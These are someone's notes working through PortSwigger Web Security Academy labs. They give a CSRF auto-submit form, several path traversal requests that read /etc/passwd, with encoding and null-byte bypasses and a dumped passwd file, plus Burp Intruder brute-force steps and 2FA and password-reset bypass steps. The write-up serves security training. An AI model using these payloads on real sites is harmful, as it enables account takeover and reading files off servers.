# PortSwigger Academy

PortSwigger Academy (https://portswigger.net/web-security/dashboard) is a collection of training materials (reading & videos) combined with hands-on-labs designed to help you learn how to "secure the web one step at a time". It covers a number of the most common vulnerabilities, helping you understand them, understand how to exploit them, and how they can be prevented. Best of all, they are all free. The tools *are* designed to work with/be supported by PortSwigger's flagship product, Burp Suite Professional, but you can utilize any number of other tools (curl/browsers/ZAP/etc). At the time I worked through these, I did not have access to a professional license, so I used the Burp Suite Community edition (free). Below are my notes written as I worked through the various challenges. 


## Topics

- [Access Control](/ctf/ps-accesscontrol.html)
- [Cross-Site Scripting](/ctf/ps-xss.html)
- [OS Command Injection](/ctf/ps-oscmdi.html)
- [SQL Injection](/ctf/ps-sqi.html)






## Cross-site Request Forgery (CSRF)

### CSRF vulnerability with no defenses

!!! question
    This lab's email change functionality is vulnerable to CSRF.

    To solve the lab, craft some HTML that uses a CSRF attack to change the viewer's email address and upload it to your exploit server.

    You can log in to your own account using the following credentials: `wiener:peter`

This first one was easy... following the instructions in the documentation on CSRF, you simply craft an evil payload something similar to the following:

```html
<html>
  <body>
    <form action="https://acbd1fc91ebd63dfc0dc1e3100420089.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="pwned@evil-user.net" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

## Clickjacking

## DOM-based Vulnerabilities

## Cross-Origin Resource Sharing (CORS)

## XML External Entity (XXE) injection

## Server-Side Request Forgery (SSRF)

## HTTP Request Smuggling


## Server-Side Template Injection

## Directory Traversal

### :material-gauge-empty: File path traversal, simple case

!!! question
    This lab contains a file path traversal vulnerability in the display of product images.

    To solve the lab, retrieve the contents of the `/etc/passwd` file.

!!! tip
    I tried to solve this using just a browser, but was unsuccessful. Primarily because the content type of the return is `image/jpeg` and since I'm pulling text (the `/etc/passwd` file), it simply doesn't render properly in the chrome developer tools. NTS: use the tool.

Poking around a bit and found that the site dynamically loads images using the following structure:

```text
https://ac101fa61fd2a9cdc02e17a800950081.web-security-academy.net/image?filename=37.jpg
```

I simply found this request in the Burp Suite proxy, forwarded it to the repeater tool and edited the `filename` parameter to be `image?filename=../../../etc/passwd` and then sent the request. The response looked like the following:

```text
HTTP/1.1 200 OK
Content-Type: image/jpeg
Connection: close
Content-Length: 1260

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
peter:x:12001:12001::/home/peter:/bin/bash
carlos:x:12002:12002::/home/carlos:/bin/bash
user:x:12000:12000::/home/user:/bin/bash
elmer:x:12099:12099::/home/elmer:/bin/bash
academy:x:10000:10000::/home/academy:/bin/bash
dnsmasq:x:101:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
messagebus:x:102:101::/nonexistent:/usr/sbin/nologin
```

### :material-gauge: File path traversal, traversal sequences blocked with absolute path bypass

!!! question
    This lab contains a file path traversal vulnerability in the display of product images.

    The application blocks traversal sequences but treats the supplied filename as being relative to a default working directory.

    To solve the lab, retrieve the contents of the `/etc/passwd` file.

This one was pretty easy. Given a request like the following:

```text
GET /image?filename=48.jpg HTTP/1.1
```

I confirmed that it didn't work the "easy way" by testing this:

```text
GET /image?filename=../../../etc/passwd HTTP/1.1
```

And received an error indicating the requested file did not exist. So, following the instructions, I adjusted the request as follows:

```text
GET /image?filename=/etc/passwd HTTP/1.1
```

And was rewarded with the contents of the `/etc/passwd` file.


### :material-gauge: File path traversal, traversal sequences stripped non-recursively

!!! question
    This lab contains a file path traversal vulnerability in the display of product images.

    The application strips path traversal sequences from the user-supplied filename before using it.

    To solve the lab, retrieve the contents of the `/etc/passwd` file.

The key to solving this lab is that the server-side code appears to be looking for instances of `../` and stripping them, but _non-recursively_. This means, that they might have a line that looks like the following bit of python:

```python
safe_path = requested_path.replace("../", "")
```

If you provide a request that looks like this: `/image?filename=....//....//....//etc/passwd`, the value of `safe_path` still has a traversal problem, which means we will still get the file we are looking for which, is in fact, the case here.

### :material-gauge: File path traversal, traversal sequences stripped with superfluous URL-decode

!!! question
    This lab contains a file path traversal vulnerability in the display of product images.

    The application blocks input containing path traversal sequences. It then performs a URL-decode of the input before using it.

    To solve the lab, retrieve the contents of the `/etc/passwd` file.

On this one, I tried URL-encoding the traversal attack as follows:

```text
GET /image?filename=%2E%2E%2f%2E%2E%2f%2E%2E%2fetc%2fpasswd HTTP/1.1
```

You see that each `.` becomes `%2e` and each `/` becomes `%2f`. But this didn't work. I then tried *double* URL encoding the path as shown below, which **did** work.

```text
GET /image?filename=%252E%252E%252f%252E%252E%252f%252E%252E%252fetc%252fpasswd HTTP/1.1
```

The problem or *bug* in this application is that they called a "safe" function (URL-decode) twice... once prior to checking for path traversal issues (a good thing) but a second time *after* checking for path traversal issues. This could almost be considered a TOCTOU type bug.


### :material-gauge: File path traversal, validation of start of path

!!! question
    This lab contains a file path traversal vulnerability in the display of product images.

    The application transmits the full file path via a request parameter, and validates that the supplied path starts with the expected folder.

    To solve the lab, retrieve the contents of the `/etc/passwd` file.

Within the HTTP request log, I found a request that looks like this:

```text
GET /image?filename=/var/www/images/47.jpg HTTP/1.1
```

I modified it as follows:

```text
GET /image?filename=/var/www/images/../../../etc/passwd HTTP/1.1
```

After submission, I was presented the `/etc/passwd` file.


### :material-gauge: File path traversal, validation of file extension with null byte bypass

!!! question
    This lab contains a file path traversal vulnerability in the display of product images.

    The application validates that the supplied filename ends with the expected file extension.

    To solve the lab, retrieve the contents of the `/etc/passwd` file.

If you take the time to [read the documentation](https://portswigger.net/web-security/file-path-traversal) on this type of issue, the solution becomes quite straight forward. The following `GET` request does the trick:

```text
GET /image?filename=../../../etc/passwd%00.jpg HTTP/1.1
```



## Authentication

### :material-gauge-empty: Username enumeration via different responses

!!! question
    This lab is vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password, which can be found in the following wordlists:

    Candidate usernames
    Candidate passwords

    To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.


Goal: Enumerate a valid username, brute-force the user's password, and then access the user's account page.

You are provided a wordlist of candidate usernames as well as a list of candidate passwords.

Here are the steps I took to solve this challenge:

1. Load up Burp and start the embedded browser
1. Connect to the URL provided and visit the `/login` page
1. Attempt to log in with a random username/password
1. View the `POST` request in Burp and send it to the intruder
1. On the Positions tab, I cleared the `§` from the session cookie, leaving just the username and password positions
1. Pasted the values from the list of candidate usernames (100 of them) into the Payload Options (simple list) and started the attack, paying attention to the response payload size.
1. After the list ran through, I sorted by response length and noticed that one of them (username: `agenda`) had a different payload length. Looking at the response text, I noticed that it said _"Incorrect password"_. 
1. Returning to the positions page, I changed the username to a static value of `agenda`
1. I cleared the payload list and pasted in the values from the candidate password list and then ran the attack
1. Watching the response lengths, I again noticed taht one of them (password: `robert`) had a different length. Inspecting the response showed that user had logged in. 
1. With this information, I then returned to the browser, manually logged in with this information, and completed the challenge

### :material-gauge: Username enumeration via subtly different responses

!!! question
    This lab is subtly vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password, which can be found in the following wordlists:

    Candidate usernames
    Candidate passwords

    To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.

Working on this challenge made me sharpen my understanding of the _intruder_ tool. I had two lists, and I wanted to run all permutations of them (combined). The mistake I had been making was that I had been failing to change the attack type from the default `Sniper` to the `Cluster Bomb` option. This let me define my two lists, each assigned to one of the two fields/positions, and then start.

After just over 10,000 attempts, we found one request that returned a `302` rather than a `200`. Logging in as `at` with a password of `7777777` solved the challenge.


### :material-gauge: Username enumeration via response timing

!!! question
    This lab is vulnerable to username enumeration using its response times. To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.

    Your credentials: wiener:peter
    Candidate usernames
    Candidate passwords


This was an unwelcome response:

!!! error 
    You have made too many incorrect login attempts. Please try again in 30 minute(s).

The more accurate statement... I should have read the instructions. You are supposed to do this in two steps: 1. enumerate the username and then 2. brute force that user's password. I tried to just do the cluster bomb approach and that was foolish.





### :material-gauge-empty: 2FA simple bypass

!!! question
    This lab's two-factor authentication can be bypassed. You have already obtained a valid username and password, but do not have access to the user's 2FA verification code. To solve the lab, access Carlos's account page.

    Your credentials: `wiener:peter`
    Victim's credentials `carlos:montoya`

Given a valid username/password and access to that account's email, as well as a victim username/password, you are asked to bypass the 2FA for the victim's account (you do not have access to their email) and get to their profile page.

Walking through the auth flow with a valid user is pretty straight foward. You log in at `/login` and then are directed to `/login2` to enter the 2FA code. Once you get that from your email, you are redirected to `/my-account`.

The "attack" is as simple as completing the first stage with the victim's credentials and then changing the URL to `/my-account`. This succeeds as there is no session logic to confirm that the 2FA code was entered (only redirection logic).

### :material-gauge-empty: Password reset broken logic

!!! question
    This lab's password reset functionality is vulnerable. To solve the lab, reset Carlos's password then log in and access his "My account" page.

    Your credentials: `wiener:peter`
    Victim's username: `carlos`

Given a valid set of credentials as well as a victim username, you are asked to reset the victim's password and then log in to view the "my account" page.

Using the valid credentials, I pretended to have forgotton my password and requested a password reset link. I then completed that process and reviewed the `POST` request to `/forgot-password`. I noticed the payload had not only the reset token and the new password, but also the username. I sent the request to the repeater, changed the `username` to the victim username and re-submitted it. The request completed, so I went to the browser, logged in with the victim username and my newly-set password and was able to view the account page.

## WebSockets

## Web Cache Poisoning

## Insecure Deserialization

## Information Disclosure

## Business Logic Vulnerabilities

## HTTP Host Header Attacks

### Basic Password Reset Poisoning

We are told that `carlos` will click any link in any email he receives. The goal is to log in to Carlos's account.

We are given a valid set of credentials.

Given the title of the challenge, I'm assuming that in the `POST` request to reset my password, there will be a header that can be manipulated or maybe in the password reset link.


## OAuth Authentication

